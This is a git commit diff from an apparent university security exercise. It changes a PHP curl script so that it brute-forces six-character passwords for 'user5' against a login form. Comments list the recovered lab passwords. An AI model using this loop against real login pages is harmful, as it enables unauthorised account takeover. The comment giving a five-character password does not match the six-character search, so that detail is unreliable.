aa1b507afabdc80bc66e3f24015e7b94435477ee
FlorianMMI <florian.bounissou@etu.unilim.fr>
2025-11-12 11:04:37 +0100

    Refactor password brute-force logic to include additional character combinations for user5

--- Auth/exo2/attack1.php
+++ Auth/exo2/attack1.php
@@ -15,33 +15,41 @@ function testURL($url, $url1){
     }
 
 for ($i = 0; $i < count($letters); $i++) {
-     for($j = 0; $j < count($letters); $j++) {
-        
-    $post = [
-        'username' => 'user2',
-        'password' => $letters[$i].$letters[$j]
+    for ($j = 0; $j < count($letters); $j++) {
+        for ($k = 0; $k < count($letters); $k++) {
+            for ($l = 0; $l < count($letters); $l++) {
+                for ($m = 0; $m < count($letters); $m++) {
+                    for ($n = 0; $n < count($letters); $n++) {
 
-    ];
+                    $post = [
+                        'username' => 'user5',
+                        'password' => $letters[$i].$letters[$j].$letters[$k].$letters[$l].$letters[$m].$letters[$n]
+                    ];
 
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-    $response = curl_exec($ch);
-    $url = curl_getinfo($ch, CURLINFO_REDIRECT_URL);
+                    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+                    $response = curl_exec($ch);
+                    $url = curl_getinfo($ch, CURLINFO_REDIRECT_URL);
 
-    
+                    if (testURL($url, $url1)) {
+                        echo "Login successful\n";
+                        echo "username: {$post['username']}\n";
+                        echo "password: {$post['password']}\n";
+                        curl_close($ch);
+                        exit(0); // stop after finding the correct password
+                    }
+                }
 
-    if(testURL($url, $url1)){
-        echo "Login successful\n";
-        echo "username: {$post['username']}\n";
-        echo "password: {$post['password']}\n";
-
-    } else {
-       continue;
+                }
+            }
+        }
     }
-    
-    
-    }
-
 }
+
+//user2 : dl
+//user3 : ftp
+//user 4 : dweb
+//user5 : abcde
+//user6 : 
 
 
 
